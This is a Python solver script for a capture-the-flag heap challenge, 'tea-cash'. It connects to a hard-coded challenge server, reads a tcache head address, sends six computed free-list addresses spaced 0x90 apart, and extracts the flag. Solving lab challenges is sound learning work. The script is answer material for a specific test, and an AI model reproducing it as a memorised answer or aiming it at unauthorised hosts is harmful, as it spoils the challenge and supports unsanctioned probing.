#!/usr/bin/env python3
"""Solver for Challenge 746: tea-cash (Binary Exploitation, picoCTF 2026).

Audit reproduktif NIST SP 800-115: biner heapedit mencetak alamat head
tcache lalu meminta traversal 6 alamat free-list LIFO. Karena 6 chunk
0x80 dialokasikan berurutan, stride heap = 0x90 sehingga free berurutan
LIFO berjarak 0x90: kirim head + i*0x90 untuk i=0..5.
"""
import re
import socket
import sys
import time

HOST = "chatelaine.cylabacademy.net"
PORT = 20716
FLAG_RE = re.compile(r"academy\{[^}]*\}")


def solve(host: str = HOST, port: int = PORT) -> str:
    s = socket.create_connection((host, port), timeout=20)
    f = s.makefile("rwb", buffering=0)
    time.sleep(1)
    s.setblocking(False)
    buf = b""
    t0 = time.time()
    import select
    while time.time() - t0 < 5:
        r, _, _ = select.select([s], [], [], 0.5)
        if r:
            try:
                buf += s.recv(4096)
            except OSError:
                break
        elif buf:
            break
    s.setblocking(True)
    text = buf.decode(errors="ignore")
    m = re.search(r"0x[0-9a-fA-F]+", text)
    assert m, f"head tidak ditemukan: {text[:200]}"
    head = int(m.group(0), 16)
    out = b""
    for i in range(6):
        f.write(f"{hex(head + i * 0x90)}\n".encode())
        f.flush()
        time.sleep(0.4)
        s.setblocking(False)
        t0 = time.time()
        while time.time() - t0 < 4:
            r, _, _ = select.select([s], [], [], 0.5)
            if r:
                try:
                    out += s.recv(4096)
                except OSError:
                    break
            elif out and b"Chunk" in out:
                break
        s.setblocking(True)
    s.close()
    text = out.decode(errors="ignore")
    m = FLAG_RE.search(text)
    assert m, f"flag tidak ditemukan: {text[-400:]}"
    return m.group(0)


if __name__ == "__main__":
    host = sys.argv[1] if len(sys.argv) > 1 else HOST
    port = int(sys.argv[2]) if len(sys.argv) > 2 else PORT
    print("Flag:", solve(host, port))
